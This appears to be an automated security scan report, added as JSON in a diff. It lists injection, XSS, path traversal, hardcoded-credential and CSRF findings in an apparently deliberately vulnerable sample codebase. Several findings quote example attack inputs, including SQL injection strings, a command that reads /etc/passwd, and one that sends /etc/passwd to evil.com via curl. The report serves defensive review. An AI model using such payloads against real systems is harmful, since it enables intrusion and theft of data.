@@ -1,0 +1,158 @@
+{
+  "summary": "Security scan completed. See the findings table below for details.",
+  "findings": [
+    {
+      "title": "SQL Injection in get_user_unsafe()",
+      "severity": "critical",
+      "location": "get_user_unsafe function",
+      "description": "User input is directly interpolated into the SQL query using f-string without parameterization, allowing attackers to inject arbitrary SQL code (e.g., ' OR '1'='1).",
+      "recommendation": "Use parameterized queries or prepared statements to safely bind user inputs.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "SQL Injection in search_products()",
+      "severity": "critical",
+      "location": "search_products function",
+      "description": "User input is directly interpolated into the SQL query using f-string without parameterization, allowing SQL injection via crafted payloads (e.g., UNION SELECT).",
+      "recommendation": "Use parameterized queries or prepared statements to safely bind user inputs.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "SQL Injection in delete_record()",
+      "severity": "critical",
+      "location": "delete_record function",
+      "description": "User input concatenated directly into SQL query string allows injection attacks such as stacked queries (e.g., '; DROP TABLE users--'). No type checking is performed.",
+      "recommendation": "Use parameterized queries and validate input types before execution.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "Command Injection in ping_host()",
+      "severity": "critical",
+      "location": "ping_host function",
+      "description": "User input is passed directly into a shell command with shell=True, enabling command injection (e.g., '8.8.8.8; cat /etc/passwd').",
+      "recommendation": "Avoid shell=True or sanitize and validate inputs strictly; use subprocess.run with a list of arguments instead.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "Command Injection in run_report()",
+      "severity": "critical",
+      "location": "run_report function",
+      "description": "User input is interpolated directly into an os.system call, allowing arbitrary command injection (e.g., 'report; curl http://evil.com/$(cat /etc/passwd)').",
+      "recommendation": "Avoid os.system with unsanitized input; use subprocess with argument list or validate and sanitize report_name input thoroughly.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "Command Injection and Path Traversal in list_files()",
+      "severity": "critical",
+      "location": "list_files function",
+      "description": "User input is concatenated into a shell command executed via os.popen, enabling command injection and path traversal (e.g., '../../etc').",
+      "recommendation": "Avoid using os.popen with unsanitized input. Use safer APIs like os.listdir with strict input validation or subprocess with argument list.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "Path Traversal in read_file()",
+      "severity": "critical",
+      "location": "read_file function",
+      "description": "Filename input is joined to a base directory without sanitization, allowing attackers to traverse directories and read arbitrary files (e.g., '../../etc/passwd').",
+      "recommendation": "Sanitize and validate filename inputs to prevent '..' segments or restrict access using whitelisting or chroot mechanisms.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/database_utils.py"
+    },
+    {
+      "title": "Hardcoded AWS Access Key ID",
+      "severity": "critical",
+      "location": "AWS_ACCESS_KEY_ID variable assignment",
+      "description": "AWS IAM access key ID is hardcoded in the source code, which risks exposure of AWS credentials.",
+      "recommendation": "Use environment variables or secure secret management solutions for AWS credentials.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/secrets_manager.py"
+    },
+    {
+      "title": "Weak hashing algorithms for password and token storage",
+      "severity": "high",
+      "location": "def hash_password_md5; def hash_password_sha1; def store_token",
+      "description": "The code uses MD5 and SHA-1 for hashing passwords, which are cryptographically broken and deprecated algorithms. Additionally, base64 encoding is used for storing tokens, which is not a secure encryption method and gives a false sense of security.",
+      "recommendation": "Use a modern password hashing function such as Argon2, bcrypt, or PBKDF2 with a salt. For token storage, use strong encryption or secure storage mechanisms rather than simple encoding.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/auth_module.py"
+    },
+    {
+      "title": "DOM-Based XSS via innerHTML in renderUserProfile",
+      "severity": "critical",
+      "location": "function renderUserProfile, line 8",
+      "description": "User input 'userName' is directly injected into innerHTML without sanitization, allowing arbitrary HTML/JavaScript injection and leading to DOM-based XSS.",
+      "recommendation": "Use safe methods like textContent or proper sanitization libraries to escape user input before rendering.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "DOM-Based XSS via document.write in displaySearchResults",
+      "severity": "critical",
+      "location": "function displaySearchResults, line 13",
+      "description": "User-controlled input 'query' is used directly inside document.write without sanitization, enabling DOM-based XSS attacks.",
+      "recommendation": "Avoid using document.write with unsanitized user input. Use safer DOM manipulation methods or sanitize inputs rigorously.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "DOM-Based XSS via innerHTML using location.hash in updateGreeting",
+      "severity": "critical",
+      "location": "function updateGreeting, line 18",
+      "description": "Untrusted data from location.hash is injected into innerHTML without any sanitization, allowing attackers to craft URLs that trigger XSS.",
+      "recommendation": "Escape or sanitize input from the URL fragment before injecting into the DOM, or use safer DOM text methods.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "Reflected XSS in Express route /search via query parameter",
+      "severity": "critical",
+      "location": "app.get('/search'), line 26",
+      "description": "The query parameter 'q' is directly reflected inside HTML response without encoding or sanitization, leading to reflected XSS.",
+      "recommendation": "Properly escape or sanitize user inputs before rendering in responses. Use templating engines with auto-escaping enabled.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "Reflected XSS in Express route /user/:name via path parameter",
+      "severity": "critical",
+      "location": "app.get('/user/:name'), line 31",
+      "description": "Path parameter 'name' is rendered directly in HTML without output encoding, allowing reflected XSS attacks.",
+      "recommendation": "Always encode or sanitize user-supplied path parameters before rendering in HTML.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "Stored XSS via localStorage and innerHTML in saveAndDisplayComment",
+      "severity": "critical",
+      "location": "function saveAndDisplayComment, line 41",
+      "description": "User input 'comment' is stored in localStorage and then injected into innerHTML without sanitization. Malicious scripts can persist and execute on page load.",
+      "recommendation": "Sanitize or encode stored content before rendering, or avoid using innerHTML for untrusted data.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "Insecure eval() usage on user input in processUserFormula",
+      "severity": "critical",
+      "location": "function processUserFormula, line 47",
+      "description": "Using eval() on user input allows arbitrary code execution, leading to severe security risks including injection attacks and full environment compromise.",
+      "recommendation": "Avoid eval(). Use safe parsers or sandboxed environments to process user formulas.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "Insecure Function constructor usage on user input in loadConfig",
+      "severity": "critical",
+      "location": "function loadConfig, line 52",
+      "description": "Constructing functions from user-supplied strings with Function() is equivalent to eval and allows arbitrary code execution.",
+      "recommendation": "Avoid dynamic code evaluation. Parse configuration data securely using structured formats like JSON.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "Open Redirect via unvalidated url parameter in /redirect route",
+      "severity": "high",
+      "location": "app.get('/redirect'), line 58",
+      "description": "Redirect target URL is taken directly from query parameter 'url' without validation. This enables phishing attacks via open redirect.",
+      "recommendation": "Validate and whitelist redirect targets to prevent redirects to arbitrary external sites.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    },
+    {
+      "title": "CSRF vulnerability due to missing CSRF token in /transfer POST route",
+      "severity": "high",
+      "location": "app.post('/transfer'), line 64",
+      "description": "The /transfer endpoint processes sensitive state-changing operations without validating CSRF tokens, allowing attackers to perform unauthorized actions via CSRF.",
+      "recommendation": "Implement CSRF protection mechanisms such as synchronizer tokens, double submit cookies, or use middleware provided by frameworks.",
+      "source_file": "/tmp/tmpexpr5wxs/src/zip_payload/src/frontend_helpers.js"
+    }
+  ],
+  "lc_summary": ""
+}
